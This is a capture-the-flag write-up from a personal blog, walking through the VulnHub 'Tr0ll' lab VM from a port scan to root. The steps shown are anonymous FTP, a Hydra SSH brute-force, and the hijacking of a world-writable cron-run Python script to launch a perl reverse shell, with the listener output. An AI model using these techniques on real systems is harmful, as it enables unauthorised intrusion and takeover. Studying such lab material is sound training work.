---
layout: post
title: The troller trolled the Tr0ll
tags:
- challenges
- escalation
- exploitation
- hacking
- Maleus
- priv
- tr0ll
- vulnhub
---
Hey everyone so this is the VM for the tr0ll server! i know it is kind of old but since i am trolling everyday in real life i thought i would try it so tr0ll2 is on the way too :D 
Let me add here that this challenge was made by Maleus and hosted by vulnhub!

Anyway lets stop with all the blabbing and start our challenge
tr0ll server ip:192.168.124.141
kali ip:192.168.124.134

At first i tried a nmap scan>root@kali:~# nmap 192.168.124.141 -vv -sV

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-10 12:01 EDT
NSE: Loaded 33 scripts for scanning.
Initiating ARP Ping Scan at 12:01
Scanning 192.168.124.141 [1 port]
Completed ARP Ping Scan at 12:01, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:01
Completed Parallel DNS resolution of 1 host. at 12:01, 0.00s elapsed
Initiating SYN Stealth Scan at 12:01
Scanning 192.168.124.141 (192.168.124.141) [1000 ports]
Discovered open port 21/tcp on 192.168.124.141
Discovered open port 22/tcp on 192.168.124.141
Discovered open port 80/tcp on 192.168.124.141
Completed SYN Stealth Scan at 12:01, 1.22s elapsed (1000 total ports)
Initiating Service scan at 12:01
Scanning 3 services on 192.168.124.141 (192.168.124.141)
Completed Service scan at 12:01, 6.10s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.124.141.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 12:01
Completed NSE at 12:01, 1.27s elapsed
Nmap scan report for 192.168.124.141 (192.168.124.141)
Host is up, received arp-response (0.00031s latency).
Scanned at 2015-10-10 12:01:04 EDT for 9s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 00:0C:29:FE:92:AF (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.040KB)


more
As we can see, we have 3 ports open! SSH,FTP,HTTP
so i started by connecting on the ftp with the classic anonymous access and guess what! i found a pcap file!



>root@kali:~# ftp 192.168.124.141
Connected to 192.168.124.141.
220 (vsFTPd 3.0.2)
Name (192.168.124.141:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.00 secs (87.4346 MB/s)
ftp> quit
221 Goodbye.


after this i downloaded the file and used wireshark to check it out!! interesting things have been captured... :D
first i found out a file named secret_stuff.txt  ( i never found this file although i kind of forgot to look for it when i accessed the server)

[![packet](https://trickster0.files.wordpress.com/2015/10/packet.png)](https://trickster0.files.wordpress.com/2015/10/packet.png)
although that is not the only thing we noticed! there was a secret folder!!!!

[![pack1](https://trickster0.files.wordpress.com/2015/10/pack1.png)](https://trickster0.files.wordpress.com/2015/10/pack1.png)
Well this is as far as we can get lets try some http enumeration and stuff...after i checked the http server boom! the tr0ll starts!

[![http1](https://trickster0.files.wordpress.com/2015/10/http1.png)](https://trickster0.files.wordpress.com/2015/10/http1.png)
nothing there so i checked the robots.txt and we found a folder named secret!

[![http2](https://trickster0.files.wordpress.com/2015/10/http2.png)](https://trickster0.files.wordpress.com/2015/10/http2.png)
holy server unveil your secrets!

[![http3](https://trickster0.files.wordpress.com/2015/10/http3.png)](https://trickster0.files.wordpress.com/2015/10/http3.png)
OMG another troll.... -_- i was like ok suuuure now what?but then it hit me!we have that sup3rs3cr3tdirlol that could be a folder and what do u know...there is a file there

[![http4](https://trickster0.files.wordpress.com/2015/10/http4.png)](https://trickster0.files.wordpress.com/2015/10/http4.png)
Ofc i downloaded it and checked it out



>root@kali:~/Downloads# strings roflmao 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Find address 0x0856BF to proceed
;*2$"
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
......


there is an interesting text telling me to find an address 0x0856BF i thought that could be a folder and checked it out...boom hints about the password of ssh hopefully ;)

[![http5](https://trickster0.files.wordpress.com/2015/10/http5.png)](https://trickster0.files.wordpress.com/2015/10/http5.png)

in the good_luck folder we found a file called which_one_lol.txt which seemed like a possible user list ofc i deleted the text that was saying <--definitely not this one so i saved it for later


[![http6](https://trickster0.files.wordpress.com/2015/10/http6.png)](https://trickster0.files.wordpress.com/2015/10/http6.png)
the other folder this_folder_contain_the_password had a Pass.txt file after opening it this is what i got...

[![http7](https://trickster0.files.wordpress.com/2015/10/http7.png)](https://trickster0.files.wordpress.com/2015/10/http7.png)

while trying to crack the damn ssh by crafting a list of the usernames and that password i got, i had zero success there was something wrong ofc the folder though told me that the password was in there but not in the file so i got the name of the Pass.txt and tried it as password so voila




>root@kali:~/Desktop# hydra ssh://192.168.124.141 -L user.txt -p Pass.txt
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2015-10-10 12:20:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 64 tasks, 10 login tries (l:10/p:1), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.124.141   login: overflow   password: Pass.txt
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-10-10 12:20:17

the username for the ssh is overflow and the password is Pass.txt so lets connect on the ssh and work some magic!

[![http8](https://trickster0.files.wordpress.com/2015/10/http8.png)](https://trickster0.files.wordpress.com/2015/10/http8.png)

This is the place where we start our system enumeration to check what we can find...i looked around didnt find anything to stand out except from a file in the /opt folder called lmao.py
which i couldnt read cause hello?low permissions so how do we do some priv escalation?we need to find writable file that can run as run so really quick we scan for any files that are writable




>sudo find / -perm -2 ! -type l -ls

what caught my attention though was this file!


>155826    4 -rwxrwxrwx   1 root     root           96 Aug 13  2014 /lib/log/cleaner.py


after cat-ing the file we can see its code



>#!/usr/bin/env python
import os
import sys
try:
    os.system('rm -f /tmp/*')
except:
    sys.exit()


this is good but how does this run???we can totally change the bash command to run something that will benefit us but how do we run it as root? lets look around...after a while i found out that cleaner.py was being executed every 2 minutes by cron schedule task. well the cleaner.py was deleting every 2 minutes whatever we might have downloaded in the /tmp folder so i modified and to this

>#!/usr/bin/env python
import os
import sys
try:
    os.system('ls /tmp/')
except:
    sys.exit()

and it gave me some time although right about now we had a problem :/ the connection was closed -_- i feel another cron task every 2 minutes as i figured out later

[![http9](https://trickster0.files.wordpress.com/2015/10/http9.png)](https://trickster0.files.wordpress.com/2015/10/http9.png)
so ofc i reconnected and i browsed to the /tmp folder as fast as possible to download the classic perl reverse shell backdoor,i edited it real quick to connect back to kali and chmod +x the shell ^_^

[![http10](https://trickster0.files.wordpress.com/2015/10/http10.png)](https://trickster0.files.wordpress.com/2015/10/http10.png)
again i had to modify the cleaner.py to execute the perl shell so i changed the code to this


>#!/usr/bin/env python
import os
import sys
try:
    os.system('/tmp/perl-reverse-shell-1.0/perl-reverse-shell.pl')
except:
    sys.exit()


and i am good to go now lets w8 for 2 minutes to start by itself...........2 minutes later boom!



>root@kali:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.124.134] from (UNKNOWN) [192.168.124.141] 57849
 09:50:01 up  1:13,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -r
3.13.0-32-generic
# uname -a
Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
# cat /opt/lmao.py
#!/usr/bin/env python
import os

os.system('echo "TIMES UP LOL!"|wall')
os.system("pkill -u 'overflow'")
sys.exit()

# ls /root/
proof.txt
# cat /root/proof.txt
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc


i included the lmao.py cause it had stuck to my head since the beginning and it was the annoying script that was disconnecting me every 2 minutes...

thx a lot for this challenge you can always learn more stuff from all the challenges cya until the next tr0ll bye everyone ;)
